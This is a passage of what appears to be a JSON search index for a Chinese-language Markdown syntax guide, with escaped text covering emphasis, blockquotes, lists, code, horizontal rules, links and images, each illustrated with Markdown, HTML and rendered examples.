is the cat's meow . A*cat*meow A<em>cat</em>meow A cat meow Markdown \u5e94\u7528\u7a0b\u5e8f\u5728\u5982\u4f55\u5904\u7406\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u7684\u4e0b\u5212\u7ebf\u4e0a\u5e76\u4e0d\u4e00\u81f4\u3002\u4e3a\u517c\u5bb9\u8003\u8651\uff0c\u8981\u659c\u4f53\u7a81\u51fa\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u90e8\u5206\u7684\u8bdd\uff0c\u8bf7\u4f7f\u7528\u661f\u53f7\uff08asterisks\uff09\u3002 \u2705 Do this \u274c Don't do this A*cat*meow A_cat_meow \u8981\u540c\u65f6\u7528\u7c97\u4f53\u548c\u659c\u4f53\u7a81\u51fa\u663e\u793a\u6587\u672c\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u524d\u540e\u5404\u6dfb\u52a0\u4e09\u4e2a\u661f\u53f7\u6216\u4e0b\u5212\u7ebf\u3002\u8981\u52a0\u7c97\u5e76\u7528\u659c\u4f53\u663e\u793a\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u8bf7\u5728\u8981\u7a81\u51fa\u663e\u793a\u7684\u90e8\u5206\u524d\u540e\u5404\u6dfb\u52a0\u4e09\u4e2a\u661f\u53f7\uff0c\u4e2d\u95f4\u4e0d\u8981\u5e26\u7a7a\u683c\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c This text is ***really important***. This text is <strong><em>really important</em></strong>. This text is really important . This text is ___really important___. This text is <strong><em>really important</em></strong>. This text is really important . This text is __*really important*__. This text is <strong><em>really important</em></strong>. This text is really important . This text is **_really important_**. This text is <strong><em>really important</em></strong>. This text is really important . This is really***very***important text. This is really<strong><em>very</em></strong>important text. This is really very important text. Markdown \u5e94\u7528\u7a0b\u5e8f\u5728\u5904\u7406\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u6dfb\u52a0\u7684\u4e0b\u5212\u7ebf\u4e0a\u5e76\u4e0d\u4e00\u81f4\u3002\u4e3a\u4e86\u5b9e\u73b0\u517c\u5bb9\u6027\uff0c\u8bf7\u4f7f\u7528\u661f\u53f7\u5c06\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u4e2d\u95f4\u90e8\u5206\u52a0\u7c97\u5e76\u4ee5\u659c\u4f53\u663e\u793a\uff0c\u4ee5\u793a\u91cd\u8981\u3002 \u2705 Do this \u274c Don't do this This is really***very***important text. This is really___very___important text.","title":"2.3.2. \u659c\u4f53"},{"location":"markdown/#underlined","text":"\u4e0b\u5212\u7ebf\u53ef\u4ee5\u901a\u8fc7 HTML \u7684 <u> \u6807\u7b7e\u6765\u5b9e\u73b0\uff1a HTML \u9884\u89c8\u6548\u679c <u>\u5e26\u4e0b\u5212\u7ebf\u6587\u672c</u> \u5e26\u4e0b\u5212\u7ebf\u6587\u672c","title":"2.3.3. \u4e0b\u5212\u7ebf"},{"location":"markdown/#blockquote","text":"\u8981\u521b\u5efa\u5757\u5f15\u7528\uff0c\u8bf7\u5728\u6bb5\u843d\u524d\u6dfb\u52a0\u4e00\u4e2a > \u7b26\u53f7\u3002 > Dorothy followed her through many of the beautiful rooms in her castle. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\u6240\u793a\uff1a Dorothy followed her through many of the beautiful rooms in her castle. \u5757\u5f15\u7528\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u6bb5\u843d\u3002\u4e3a\u6bb5\u843d\u4e4b\u95f4\u7684\u7a7a\u767d\u884c\u6dfb\u52a0\u4e00\u4e2a > \u7b26\u53f7\u3002 > Dorothy followed her through many of the beautiful rooms in her castle. > > The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a Dorothy followed her through many of the beautiful rooms in her castle. The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u5757\u5f15\u7528\u53ef\u4ee5\u5d4c\u5957\u3002\u5728\u8981\u5d4c\u5957\u7684\u6bb5\u843d\u524d\u6dfb\u52a0\u4e00\u4e2a >> \u7b26\u53f7\u3002 > Dorothy followed her through many of the beautiful rooms in her castle. > >> The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a Dorothy followed her through many of the beautiful rooms in her castle. The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u5757\u5f15\u7528\u53ef\u4ee5\u5305\u542b\u5176\u4ed6 Markdown \u683c\u5f0f\u7684\u5143\u7d20\u3002\u5e76\u975e\u6240\u6709\u5143\u7d20\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f60\u9700\u8981\u8fdb\u884c\u5b9e\u9a8c\u4ee5\u67e5\u770b\u54ea\u4e9b\u5143\u7d20\u6709\u6548\u3002 > #### The quarterly results look great! > > - Revenue was off the chart. > - Profits were higher than ever. > > *Everything* is going according to **plan**. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a","title":"2.4. \u5757\u5f15\u7528"},{"location":"markdown/#the-quarterly-results-look-great","text":"Revenue was off the chart. Profits were higher than ever. Everything is going according to plan .","title":"The quarterly results look great!"},{"location":"markdown/#lists","text":"\u53ef\u4ee5\u5c06\u591a\u4e2a\u6761\u76ee\u7ec4\u7ec7\u6210\u6709\u5e8f\u6216\u65e0\u5e8f\u5217\u8868\u3002","title":"2.5. \u5217\u8868"},{"location":"markdown/#ordered-lists","text":"\u8981\u521b\u5efa\u6709\u5e8f\u5217\u8868\uff0c\u8bf7\u5728\u6bcf\u4e2a\u5217\u8868\u9879\u524d\u6dfb\u52a0\u6570\u5b57\u5e76\u7d27\u8ddf\u4e00\u4e2a\u82f1\u6587\u53e5\u70b9\u3002\u6570\u5b57\u4e0d\u5fc5\u6309\u6570\u5b66\u987a\u5e8f\u6392\u5217\uff0c\u4f46\u662f\u5217\u8868\u5e94\u5f53\u4ee5\u6570\u5b57 1 \u8d77\u59cb\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c 1. First item 2. Second item 3. Third item 4. Fourth item <ol> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ol> First item Second item Third item Fourth item 1. First item 8. Second item 3. Third item 5. Fourth item <ol> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ol> First item Second item Third item Fourth item 1. First item 2. Second item 3. Third item 1. Indented item 2. Indented item 4. Fourth item <ol> <li>First item</li> <li>Second item</li> <li>Third item <ol> <li>Indented item</li> <li>Indented item</li> </ol> </li> <li>Fourth item</li> </ol> First item Second item Third item Indented item Indented item Fourth item CommonMark \u548c\u5176\u4ed6\u4e00\u4e9b\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u5141\u8bb8\u60a8\u4f7f\u7528\u62ec\u53f7 ( ) ) \u4f5c\u4e3a\u5206\u9694\u7b26\uff08\u4f8b\u5982\uff0c 1) First item \uff09\uff0c\u4f46\u5e76\u975e\u6240\u6709 Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u8fd9\u4e00\u70b9\uff0c\u56e0\u6b64\u4ece\u517c\u5bb9\u6027\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u9009\u62e9\u3002\u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u4ec5\u4f7f\u7528\u53e5\u70b9\u3002 \u2705 Do this \u274c Don't do this 1. First item 2. Second item 1) First item 2) Second item","title":"2.5.1. \u6709\u5e8f\u5217\u8868"},{"location":"markdown/#unordered-lists","text":"\u8981\u521b\u5efa\u65e0\u5e8f\u5217\u8868\uff0c\u8bf7\u5728\u6bcf\u4e2a\u5217\u8868\u9879\u524d\u9762\u6dfb\u52a0\u7834\u6298\u53f7 (-)\u3001\u661f\u53f7 (*) \u6216\u52a0\u53f7 (+) \u3002\u7f29\u8fdb\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u8868\u9879\u53ef\u521b\u5efa\u5d4c\u5957\u5217\u8868\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c - First item - Second item - Third item - Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ul> First item Second item Third item Fourth item * First item * Second item * Third item * Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ul> First item Second item Third item Fourth item + First item + Second item + Third item + Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ul> First item Second item Third item Fourth item - First item - Second item - Third item - Indented item - Indented item - Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item <ul> <li>Indented item</li> <li>Indented item</li> </ul> </li> <li>Fourth item</li> </ul> First item Second item Third item Indented item Indented item Fourth item Markdown \u5e94\u7528\u7a0b\u5e8f\u4e0d\u540c\u610f\u5982\u4f55\u5904\u7406\u540c\u4e00\u5217\u8868\u4e2d\u7684\u4e0d\u540c\u5206\u9694\u7b26\u3002\u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u4e0d\u8981\u5728\u540c\u4e00\u4e2a\u5217\u8868\u4e2d\u6df7\u5408\u548c\u5339\u914d\u5206\u9694\u7b26 -- \u9009\u62e9\u4e00\u4e2a\u5e76\u575a\u6301\u4f7f\u7528\u5b83\u3002 \u2705 Do this \u274c Don't do this - First item - Second item - Third item - Fourth item + First item * Second item - Third item + Fourth item","title":"2.5.2. \u65e0\u5e8f\u5217\u8868"},{"location":"markdown/#nest-other-elements-inline-lists","text":"\u8981\u5728\u4fdd\u7559\u5217\u8868\u8fde\u7eed\u6027\u7684\u540c\u65f6\u5728\u5217\u8868\u4e2d\u6dfb\u52a0\u53e6\u4e00\u79cd\u5143\u7d20\uff0c\u8bf7\u5c06\u8be5\u5143\u7d20\u7f29\u8fdb\u56db\u4e2a\u7a7a\u683c\u6216\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u5982\u4e0b\u4f8b\u6240\u793a\uff1a * This is the first list item. * Here's the second list item. I need to add another paragraph below the second list item. > A blockquote would look great below the second list item. <html> <head> <title>Test</title> </head> </html> ![Tux, the Linux mascot](/img/tux.png) 1. First item 2. Second item 3. Third item 4. Fourth item * And here's the third list item. This is the first list item. Here's the second list item. I need to add another paragraph below the second list item. A blockquote would look great below the second list item. <html> <head> <title>Test</title> </head> </html> First item Second item Third item Fourth item And here's the third list item.","title":"2.5.3. \u5728\u5217\u8868\u4e2d\u5d4c\u5957\u5176\u4ed6\u5143\u7d20"},{"location":"markdown/#code","text":"\u8981\u5c06\u5355\u8bcd\u6216\u77ed\u8bed\u8868\u793a\u4e3a\u4ee3\u7801\uff0c\u8bf7\u5c06\u5176\u5305\u88f9\u5728\u53cd\u5f15\u53f7 ( ` ) \u4e2d\u3002 \u5982\u679c\u4f60\u8981\u8868\u793a\u4e3a\u4ee3\u7801\u7684\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u53cd\u5f15\u53f7\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u5c06\u5355\u8bcd\u6216\u77ed\u8bed\u5305\u88f9\u5728\u53cc\u53cd\u5f15\u53f7( `` )\u4e2d\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c At the command prompt, type `nano`. At the command prompt, type <code>nano</code>. At the command prompt, type nano . ``Use `code` in your Markdown file.`` <code>Use `code` in your Markdown file.</code> Use `code` in your Markdown file. \u8981\u521b\u5efa\u4ee3\u7801\u5757\uff0c\u8bf7\u5c06\u4ee3\u7801\u5757\u7684\u6bcf\u4e00\u884c\u7f29\u8fdb\u81f3\u5c11\u56db\u4e2a\u7a7a\u683c\u6216\u4e00\u4e2a\u5236\u8868\u7b26\u3002 <html> <head> </head> </html> <html> <head> </head> </html> Note: \u8981\u521b\u5efa\u4e0d\u7528\u7f29\u8fdb\u7684\u4ee3\u7801\u5757\uff0c\u8bf7\u4f7f\u7528 \u56f4\u680f\u5f0f\u4ee3\u7801\u5757\uff08fenced code blocks\uff09 .","title":"2.6. \u4ee3\u7801\u8bed\u6cd5"},{"location":"markdown/#horizontal-rules","text":"\u60a8\u53ef\u4ee5\u901a\u8fc7\u5728\u4e00\u884c\u4e0a\u5355\u72ec\u653e\u7f6e\u4e09\u4e2a\u6216\u66f4\u591a\u8fde\u5b57\u7b26 ( --- ) \u3001\u661f\u53f7 ( *** )\u6216\u4e0b\u5212\u7ebf ( ___ )\u6765\u751f\u6210\u6c34\u5e73\u89c4\u5219\u6807\u8bb0 ( <hr /> )\u3002 \u5982\u679c\u60a8\u613f\u610f\uff0c\u53ef\u4ee5\u5728 - \u6216 * \u4e4b\u95f4\u4f7f\u7528\u7a7a\u683c\u3002\u4ee5\u4e0b\u6bcf\u4e00\u884c\u90fd\u4f1a\u4ea7\u751f\u4e00\u6761\u6c34\u5e73\u7ebf\uff1a * * * *** ***** - - - --------------------------------------- _________________ \u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u8bf7\u5728\u5206\u9694\u7ebf\u7684\u524d\u540e\u5747\u6dfb\u52a0\u7a7a\u767d\u884c\u3002","title":"2.7. \u5206\u9694\u7ebf"},{"location":"markdown/#links","text":"Markdown \u652f\u6301\u4e24\u79cd\u6837\u5f0f\u7684\u94fe\u63a5\uff1a\u5185\u8054(inline)\u548c\u5f15\u7528(reference)\u3002\u5728\u8fd9\u4e24\u79cd\u6837\u5f0f\u4e2d\uff0c\u94fe\u63a5\u6587\u672c\u7531 [\u65b9\u62ec\u53f7] \u5206\u9694\u3002","title":"2.8. \u94fe\u63a5\u8bed\u6cd5"},{"location":"markdown/#inline-links","text":"\u8981\u521b\u5efa\u5185\u8054\u94fe\u63a5\uff0c\u8bf7\u5728\u94fe\u63a5\u6587\u672c\u7684\u53f3\u65b9\u62ec\u53f7\u4e4b\u540e\u7acb\u5373\u4f7f\u7528\u4e00\u7ec4\u5e38\u89c4\u62ec\u53f7\u3002\u5728\u62ec\u53f7\u5185\uff0c\u5c06 URL \u653e\u5728\u60a8\u5e0c\u671b\u94fe\u63a5\u6307\u5411\u7684\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u94fe\u63a5\u7684 \u53ef\u9009 \u6807\u9898\uff0c\u5e76\u7528\u5f15\u53f7\u62ec\u8d77\u6765\u3002\u4f8b\u5982\uff1a This is [an example](http://example.com/ \"Title\") inline link. [This link](http://example.net/) has no title attribute. \u5c06\u4ea7\u751f\uff1a This is an example inline link. This link has no title attribute. \u5982\u679c\u60a8\u6307\u7684\u662f\u540c\u4e00\u670d\u52a1\u5668\u4e0a\u7684\u672c\u5730\u8d44\u6e90\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff1a See my [About](/about/) page for details.","title":"2.8.1. \u5185\u8054\u94fe\u63a5"},{"location":"markdown/#reference-links","text":"\u5f15\u7528\u6837\u5f0f\u94fe\u63a5\u4f7f\u7528\u7b2c\u4e8c\u7ec4\u65b9\u62ec\u53f7\uff0c\u60a8\u53ef\u4ee5\u5728\u5176\u4e2d\u653e\u7f6e\u60a8\u9009\u62e9\u7684\u6807\u7b7e\u6765\u6807\u8bc6\u94fe\u63a5\uff0c\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u7a7a\u683c\u6765\u5206\u9694\u62ec\u53f7\u7ec4\uff1a This is [an example][id] reference-style link. This is [an example] [id] reference-style link. \u7136\u540e\uff0c\u5728\u6587\u6863\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u60a8\u90fd\u53ef\u4ee5\u50cf\u8fd9\u6837\u5728\u4e00\u884c\u4e0a\u5b9a\u4e49\u94fe\u63a5\u6807\u7b7e\uff1a [id]: http://example.com/ \"Optional Title Here\" \u5f15\u7528\u7c7b\u578b\u94fe\u63a5\u7684\u7b2c\u4e8c\u90e8\u5206\u4f7f\u7528\u4ee5\u4e0b\u5c5e\u6027\u8bbe\u7f6e\u683c\u5f0f\uff1a \u5305\u542b\u94fe\u63a5\u6807\u8bc6\u7b26\u7684\u65b9\u62ec\u53f7\uff08\u53ef\u9009\u4ece\u5de6\u8fb9\u8ddd\u7f29\u8fdb\u6700\u591a\u4e09\u4e2a\u7a7a\u683c\uff09\uff1b \u540e\u8ddf\u4e00\u4e2a\u5192\u53f7\uff1b \u540e\u8ddf\u4e00\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\uff08\u6216\u5236\u8868\u7b26\uff09\uff1b \u540e\u8ddf\u94fe\u63a5\u7684 URL\uff1b \u53ef\u9009\u5730\u540e\u8ddf\u94fe\u63a5\u7684\u6807\u9898\u5c5e\u6027\uff0c\u7528\u53cc\u5f15\u53f7\u6216\u5355\u5f15\u53f7\u62ec\u8d77\u6765\uff0c\u6216\u8005\u7528\u62ec\u53f7\u62ec\u8d77\u6765\u3002 \u4ee5\u4e0b\u51e0\u79cd\u94fe\u63a5\u5b9a\u4e49\u662f\u7b49\u4ef7\u7684\uff1a [foo]: http://example.com/ \"Optional Title Here\" [foo]: http://example.com/ 'Optional Title Here' [foo]: http://example.com/ (Optional Title Here) \u94fe\u63a5 URL \u53ef\u4ee5\u9009\u62e9\u7528\u5c16\u62ec\u53f7\u62ec\u8d77\u6765\uff1a [id]: <http://example.com/> \"Optional Title Here\" \u60a8\u53ef\u4ee5\u5c06 title \u5c5e\u6027\u653e\u5728\u4e0b\u4e00\u884c\u5e76\u4f7f\u7528\u989d\u5916\u7684\u7a7a\u683c\u6216\u5236\u8868\u7b26\u8fdb\u884c\u586b\u5145\uff0c\u8fd9\u5bf9\u4e8e\u8f83\u957f\u7684 URL \u770b\u8d77\u6765\u4f1a\u66f4\u597d\uff1a [id]: http://example.com/longish/path/to/resource/here \"Optional Title Here\" \u94fe\u63a5\u5b9a\u4e49\u4ec5\u7528\u4e8e\u5728 Markdown \u5904\u7406\u671f\u95f4\u521b\u5efa\u94fe\u63a5\uff0c\u5e76\u5728 HTML \u8f93\u51fa\u4e2d\u4ece\u60a8\u7684\u6587\u6863\u4e2d\u5220\u9664\u3002 \u94fe\u63a5\u5b9a\u4e49\u540d\u79f0\u53ef\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u683c\u548c\u6807\u70b9\u7b26\u53f7\u2014\u2014\u4f46\u5b83\u4eec\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u3002\u4f8b\u5982\u8fd9\u4e24\u4e2a\u94fe\u63a5\u662f\u7b49\u4ef7\u7684\uff1a [link text][a] [link text][A]","title":"2.8.2. \u5f15\u7528\u94fe\u63a5"},{"location":"markdown/#implicit-links","text":"\u9690\u5f0f\u94fe\u63a5\u65b9\u5f0f\u5141\u8bb8\u60a8\u7701\u7565\u94fe\u63a5\u540d\u79f0\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u94fe\u63a5\u6587\u672c\u672c\u8eab\u7528\u4f5c\u540d\u79f0\u3002\u53ea\u9700\u4f7f\u7528\u4e00\u7ec4\u7a7a\u65b9\u62ec\u53f7\u2014\u2014\u4f8b\u5982\uff0c\u5c06\u201cGoogle\u201d\u8fd9\u4e2a\u8bcd\u94fe\u63a5\u5230 google.com \u7f51\u7ad9\uff0c\u4f60\u53ef\u4ee5\u7b80\u5355\u5730\u5199\uff1a [Google][] [Google]: http://google.com/ \u56e0\u4e3a\u94fe\u63a5\u540d\u79f0\u53ef\u80fd\u5305\u542b\u7a7a\u683c\uff0c\u6240\u4ee5\u6b64\u5feb\u6377\u65b9\u5f0f\u751a\u81f3\u9002\u7528\u4e8e\u94fe\u63a5\u6587\u672c\u4e2d\u7684\u591a\u4e2a\u5355\u8bcd\uff1a Visit [Daring Fireball][] for more information. [Daring Fireball]: http://daringfireball.net/","title":"2.8.3. \u9690\u5f0f\u94fe\u63a5"},{"location":"markdown/#automatic-links","text":"Markdown \u652f\u6301\u4e3a URL \u548c\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u521b\u5efa\u201c\u81ea\u52a8\u201d\u94fe\u63a5\u7684\u5feb\u6377\u65b9\u5f0f\uff1a\u53ea\u9700\u5c06 URL \u6216\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7528\u5c16\u62ec\u53f7\u62ec\u8d77\u6765\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u60a8\u60f3\u663e\u793a URL \u6216\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7684\u5b9e\u9645\u6587\u672c\uff0c\u5e76\u4f7f\u5176\u6210\u4e3a\u53ef\u70b9\u51fb\u7684\u94fe\u63a5\uff0c\u60a8\u53ef\u4ee5\u8fd9\u6837\u505a\uff1a <http://example.com/> Markdown \u4f1a\u5c06\u5176\u53d8\u6210\uff1a <a href=\"http://example.com/\">http://example.com/</a> \u7535\u5b50\u90ae\u4ef6\u5730\u5740\u7684\u81ea\u52a8\u94fe\u63a5\u7684\u5de5\u4f5c\u65b9\u5f0f\u7c7b\u4f3c\uff0c\u9664\u4e86 Markdown \u8fd8\u5c06\u6267\u884c\u4e00\u4e9b\u968f\u673a\u7684\u5341\u8fdb\u5236\u548c\u5341\u516d\u8fdb\u5236\u5b9e\u4f53\u7f16\u7801\uff0c\u4ee5\u5e2e\u52a9\u4ece\u5730\u5740\u6536\u96c6\u5783\u573e\u90ae\u4ef6\u673a\u5668\u4eba\u4e2d\u9690\u85cf\u60a8\u7684\u5730\u5740\u3002\u4f8b\u5982\uff0cMarkdown \u4f1a\u5c06\u8fd9\u6837\uff1a <address@example.com> \u53d8\u6210\u8fd9\u6837\u7684\u4e1c\u897f\uff1a <a href=\"&#x6D;&#x61;i&#x6C;&#x74;&#x6F;:&#x61;&#x64;&#x64;&#x72;&#x65; &#115;&#115;&#64;&#101;&#120;&#x61;&#109;&#x70;&#x6C;e&#x2E;&#99;&#111; &#109;\">&#x61;&#x64;&#x64;&#x72;&#x65;&#115;&#115;&#64;&#101;&#120;&#x61; &#109;&#x70;&#x6C;e&#x2E;&#99;&#111;&#109;</a> \u5b83\u5c06\u5728\u6d4f\u89c8\u5668\u4e2d\u5448\u73b0\u4e3a\u201caddress@example.com\u201d\u7684\u53ef\u70b9\u51fb\u94fe\u63a5\u3002 \uff08\u8fd9\u79cd\u5b9e\u4f53\u7f16\u7801\u6280\u5de7\u786e\u5b9e\u4f1a\u6b3a\u9a97\u8bb8\u591a\uff08\u5982\u679c\u4e0d\u662f\u5927\u591a\u6570\uff09\u5730\u5740\u6536\u96c6\u673a\u5668\u4eba\uff0c\u4f46\u5b83\u80af\u5b9a\u4e0d\u4f1a\u6b3a\u9a97\u6240\u6709\u8fd9\u4e9b\u3002\u603b\u6bd4\u6ca1\u6709\u597d\uff0c\u4f46\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u53d1\u5e03\u7684\u5730\u5740\u6700\u7ec8\u53ef\u80fd\u4f1a\u5f00\u59cb\u63a5\u6536\u5783\u573e\u90ae\u4ef6\u3002\uff09","title":"2.8.4. \u81ea\u52a8\u94fe\u63a5"},{"location":"markdown/#emphasis-links","text":"\u5f3a\u8c03 \u94fe\u63a5, \u5728\u94fe\u63a5\u8bed\u6cd5\u524d\u540e\u589e\u52a0\u661f\u53f7\u3002 \u8981\u5c06\u94fe\u63a5\u8868\u793a\u4e3a\u4ee3\u7801\uff0c\u8bf7\u5728\u65b9\u62ec\u53f7\u4e2d\u6dfb\u52a0\u53cd\u5f15\u53f7\u3002 I love supporting the **[EFF](https://eff.org)**. This is the *[Markdown Guide](https://www.markdownguide.org)*. See the section on [`code`](#code). \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a I love supporting the EFF . This is the Markdown Guide . See the section on code .","title":"2.8.5. \u5e26\u683c\u5f0f\u7684\u94fe\u63a5"},{"location":"markdown/#link-examples","text":"\u94fe\u63a5\u5b9a\u4e49\u53ef\u4ee5\u653e\u5728 Markdown \u6587\u6863\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e\u3002\u6211\u503e\u5411\u4e8e\u5c06\u5b83\u4eec\u653e\u5728\u4f7f\u7528\u5b83\u4eec\u7684\u6bcf\u4e2a\u6bb5\u843d\u4e4b\u540e\uff0c\u4f46\u662f\u5982\u679c\u60a8\u613f\u610f\uff0c\u53ef\u4ee5\u5c06\u5b83\u4eec\u5168\u90e8\u653e\u5728\u6587\u6863\u7684\u672b\u5c3e\uff0c\u6709\u70b9\u50cf\u811a\u6ce8\u3002 \u4ee5\u4e0b\u662f\u5b9e\u9645\u53c2\u8003\u94fe\u63a5\u7684\u793a\u4f8b\uff1a I get 10 times more traffic from [Google] [1] than from [Yahoo] [2] or [MSN] [3]. [1]: http://google.com/ \"Google\" [2]: http://search.yahoo.com/ \"Yahoo Search\" [3]: http://search.msn.com/ \"MSN Search\" \u4f7f\u7528\u9690\u5f0f\u94fe\u63a5\u540d\u79f0\u5feb\u6377\u65b9\u5f0f\uff0c\u60a8\u53ef\u4ee5\u6539\u4e3a\u7f16\u5199\uff1a I get 10 times more traffic from [Google][] than from [Yahoo][] or [MSN][]. [google]: http://google.com/ \"Google\" [yahoo]: http://search.yahoo.com/ \"Yahoo Search\" [msn]: http://search.msn.com/ \"MSN Search\" \u4e3a\u4e86\u6bd4\u8f83\uff0c\u8fd9\u91cc\u662f\u4f7f\u7528 Markdown \u7684\u5185\u8054\u94fe\u63a5\u6837\u5f0f\u7f16\u5199\u7684\u76f8\u540c\u6bb5\u843d\uff1a I get 10 times more traffic from [Google](http://google.com/ \"Google\") than from [Yahoo](http://search.yahoo.com/ \"Yahoo Search\") or [MSN](http://search.msn.com/ \"MSN Search\"). \u5f15\u7528\u98ce\u683c\u94fe\u63a5\u7684\u91cd\u70b9\u4e0d\u662f\u5b83\u4eec\u66f4\u5bb9\u6613\u7f16\u5199\u3002\u5173\u952e\u662f\uff0c\u4f7f\u7528\u5f15\u7528\u6837\u5f0f\u7684\u94fe\u63a5\uff0c\u60a8\u7684\u6587\u6863\u6e90\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u5927\u5927\u63d0\u9ad8\u3002\u6bd4\u8f83\u4e0a\u9762\u7684\u4f8b\u5b50\uff1a\u4f7f\u7528\u5f15\u7528\u6837\u5f0f\u7684\u94fe\u63a5\uff0c\u6bb5\u843d\u672c\u8eab\u53ea\u6709 81 \u4e2a\u5b57\u7b26\u957f\uff1b\u4f7f\u7528\u5185\u8054\u6837\u5f0f\u7684\u94fe\u63a5\uff0c\u5b83\u662f 176 \u4e2a\u5b57\u7b26\uff1b\u4f5c\u4e3a\u539f\u59cb HTML\uff0c\u5b83\u662f 234 \u4e2a\u5b57\u7b26\u3002\u5728\u539f\u59cb HTML \u4e2d\uff0c\u6807\u8bb0\u6bd4\u6587\u672c\u591a\u3002 \u4f7f\u7528 Markdown \u7684\u5f15\u7528\u6837\u5f0f\u94fe\u63a5\uff0c\u6e90\u6587\u6863\u66f4\u63a5\u8fd1\u4e8e\u6700\u7ec8\u8f93\u51fa\uff0c\u5982\u5728\u6d4f\u89c8\u5668\u4e2d\u5448\u73b0\u7684\u90a3\u6837\u3002\u901a\u8fc7\u5141\u8bb8\u60a8\u5c06\u4e0e\u6807\u8bb0\u76f8\u5173\u7684\u5143\u6570\u636e\u79fb\u51fa\u6bb5\u843d\uff0c\u60a8\u53ef\u4ee5\u6dfb\u52a0\u94fe\u63a5\u800c\u4e0d\u4f1a\u4e2d\u65ad\u6563\u6587\u7684\u53d9\u8ff0\u6d41\u7a0b\u3002","title":"2.8.6. \u793a\u4f8b\u8bf4\u660e"},{"location":"markdown/#images","text":"Markdown \u4f7f\u7528\u7684\u56fe\u50cf\u8bed\u6cd5\u65e8\u5728\u7c7b\u4f3c\u4e8e\u94fe\u63a5\u7684\u8bed\u6cd5\uff0c\u5141\u8bb8\u4e24\u79cd\u6837\u5f0f\uff1a\u5185\u8054(inline)\u548c\u5f15\u7528(reference)\u3002 \u5185\u8054\u56fe\u50cf\u8bed\u6cd5\u5982\u4e0b\u6240\u793a\uff1a ![Alt text](/path/to/img.jpg) ![Alt text](/path/to/img.jpg \"Optional title\") \u5185\u8054\u56fe\u50cf\u8bed\u6cd5\u683c\u5f0f\uff1a \u611f\u53f9\u53f7\uff1a!; \u540e\u8ddf\u4e00\u7ec4\u65b9\u62ec\u53f7\uff0c\u5305\u542b\u56fe\u50cf\u7684\u5c5e\u6027\u6587\u672c\uff1b \u540e\u8ddf\u4e00\u7ec4\u62ec\u53f7\uff0c\u5305\u542b\u56fe\u50cf\u7684 URL \u6216\u8def\u5f84\uff0c\u4ee5\u53ca title \u7528\u53cc\u5f15\u53f7\u6216\u5355\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u53ef\u9009\u5c5e\u6027\u3002 \u56fe\u50cf\u5f15\u7528\u4f7f\u7528\u4e0e\u94fe\u63a5\u5f15\u7528\u76f8\u540c\u7684\u8bed\u6cd5\u5b9a\u4e49\u3002\u5f15\u7528\u98ce\u683c\u7684\u56fe\u50cf\u8bed\u6cd5\u5982\u4e0b\u6240\u793a\uff1a ![Alt text][id] [id]: url/to/image \"Optional title attribute\" \u5176\u4e2d\u201cid\u201d\u662f\u5b9a\u4e49\u7684\u56fe\u50cf\u5f15\u7528\u7684\u540d\u79f0\u3002 \u5728\u64b0\u5199\u672c\u6587\u65f6\uff0cMarkdown 